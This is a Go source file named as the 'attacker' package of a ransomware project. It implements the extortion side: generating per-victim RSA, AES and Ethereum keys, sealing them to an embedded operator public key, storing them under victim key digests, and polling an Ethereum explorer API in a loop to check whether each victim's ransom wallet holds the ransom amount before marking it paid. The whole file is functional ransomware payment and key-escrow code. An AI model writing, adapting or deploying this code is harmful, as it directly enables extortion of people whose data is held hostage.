package attacker

import (
    "os"
    "time"
    "bufio"
    "runtime"
    "net/http"
    "io/ioutil"
    "crypto/aes"
    "crypto/rsa"
    "crypto/rand"
    "crypto/cipher"
    "path/filepath"
    "encoding/json"

    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
    "github.com/sug0/sr-ransomware/go/net/ratelimit"
    ethereum "github.com/ethereum/go-ethereum/crypto"
)

//go:generate go run generate/key.go

type Scheme struct {
    key    *rsa.PublicKey
    path   string
    client http.Client
}

type Keys struct {
    Wallet string
    Public []byte
    Secret []byte
}

type slice struct {
    Data uintptr
    Len  int
    Cap  int
}

type ethexplorer struct {
    ETH struct {
        Balance float64 `json:"balance"`
    }
}

func NewScheme() *Scheme {
    path := os.Getenv("FLUPATH")
    if path != "" {
        return NewSchemeWithPath(path)
    }
    if runtime.GOOS == "windows" {
        return NewSchemeWithPath(os.Getenv("TMP"))
    }
    return NewSchemeWithPath("/tmp")
}

func NewSchemeWithPath(path string) *Scheme {
    pk, _ := util.ImportDERPublicKeyRSA(oraclePublicKey)
    return &Scheme{
        key: pk,
        path: filepath.Clean(path),
        client: ratelimit.NewHTTPClient(5 * time.Minute, 32 * time.Millisecond, true),
    }
}

func (s *Scheme) VerifyPayment(pubkey string) []byte {
    aesIVKey, err := ioutil.ReadFile(filepath.Join(s.path, pubkey, "clr"))
    if err != nil {
        return nil
    }
    if len(aesIVKey) != 32 {
        return nil
    }
    return aesIVKey
}

func (s *Scheme) VerifyPaymentsBackground() {
    for {
        var err error
        var dir *os.File
        var ents []os.FileInfo
        dir, err = os.Open(s.path)
        if err != nil {
            goto next_cycle
        }
        ents, err = dir.Readdir(-1)
        if err != nil {
            dir.Close()
            goto next_cycle
        }
        dir.Close()
        for i := 0; i < len(ents); i++ {
            pubkey := ents[i].Name()
            clr, err := os.OpenFile(filepath.Join(s.path, pubkey, "clr"), os.O_CREATE|os.O_WRONLY, 0600)
            if err != nil {
                continue
            }
            if stat, _ := clr.Stat(); stat != nil && stat.Size() != 0 {
                clr.Close()
                continue
            }
            if s.localVerifyPayment(pubkey) {
                clr.Write([]byte("1"))
                clr.Close()
                time.Sleep(420 * time.Millisecond)
            }
        }
    next_cycle:
        time.Sleep(10 * time.Minute)
    }
}

func (s *Scheme) localVerifyPayment(pubkey string) bool {
    wallet, err := ioutil.ReadFile(filepath.Join(s.path, pubkey, "add"))
    if err != nil {
        return false
    }
    balance, ok := s.checkBalance(string(wallet))
    if !ok {
        return false
    }
    return balance >= ransomValue
}

func (s *Scheme) checkBalance(wallet string) (float64, bool) {
    rsp, err := s.client.Get("https://api.ethplorer.io/getAddressInfo/" + wallet + "?apiKey=freekey")
    if err != nil {
        return 0.0, false
    }
    defer rsp.Body.Close()
    var e ethexplorer
    err = json.NewDecoder(bufio.NewReader(rsp.Body)).Decode(&e)
    if err != nil {
        return 0.0, false
    }
    return e.ETH.Balance, true
}

func (s *Scheme) GenerateAndStoreKeys() (*Keys, error) {
    // generate the keys
    sk, err := util.GenerateKeyRSA(rsaKeyBits)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate RSA secret key", err)
    }
    aesIVKey, err := util.GenerateIVandKeyAES()
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate AES", err)
    }
    eth, err := ethereum.GenerateKey()
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to generate ETH key", err)
    }

    // export public key
    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to marshal RSA public key", err)
    }

    // export and encrypt secret key
    skData, err := util.ExportDERSecretKeyRSA(sk)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to marshal RSA secret key", err)
    }
    skData = util.Pad(skData, aes.BlockSize)

    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
    aesCiph := cipher.NewCTR(aesBlock, aesIVKey[:16])

    aesCiph.XORKeyStream(skData, skData)

    // encrypt aes key and nonce
    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, s.key, aesIVKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to encrypt AES key", err)
    }

    // encrypt eth key
    ethEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, s.key, ethereum.FromECDSA(eth))
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to encrypt ETH key", err)
    }

    // calc hash digest of public key
    ds := util.Sha1Digest(pkData)

    // create directory for keys
    err = os.Mkdir(filepath.Join(s.path, ds), os.ModePerm)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to create dir", err)
    }

    // write aes and eth keys
    wallet := ethereum.PubkeyToAddress(eth.PublicKey).Hex()

    err = ioutil.WriteFile(filepath.Join(s.path, ds, "aes"), aesEncrypted, 0600)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to save AES key", err)
    }
    err = ioutil.WriteFile(filepath.Join(s.path, ds, "eth"), ethEncrypted, 0600)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to save ETH key", err)
    }
    err = ioutil.WriteFile(filepath.Join(s.path, ds, "add"), []byte(wallet), 0600)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to save ETH address", err)
    }

    return &Keys{wallet, pkData, skData}, nil
}
